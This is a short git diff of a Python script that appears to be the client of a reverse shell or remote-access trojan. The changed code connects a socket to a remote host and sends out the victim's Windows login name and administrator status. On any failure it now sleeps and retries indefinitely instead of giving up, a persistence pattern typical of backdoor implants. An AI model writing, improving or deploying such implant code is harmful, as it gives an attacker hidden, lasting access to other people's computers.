@@ -38,7 +38,8 @@ def connection():
 
 def session_handler():
     try:
-        connection()
+        print(f'[+] Connection to {host_ip}')
+        sock.connect((host_ip, host_port))
         outbound(os.getlogin())
         outbound(ctypes.windll.shell32.IsUserAnAdmin)
         time.sleep(1)
@@ -85,8 +86,10 @@ def session_handler():
             except Exception:
                 sock.close()
                 break
-    except ConnectionRefusedError:
-        pass
+    except:
+        time.sleep(20)
+        print(f'[+] Error connecting to {host_ip}')
+        session_handler()
 
 if __name__ == '__main__':
     try:
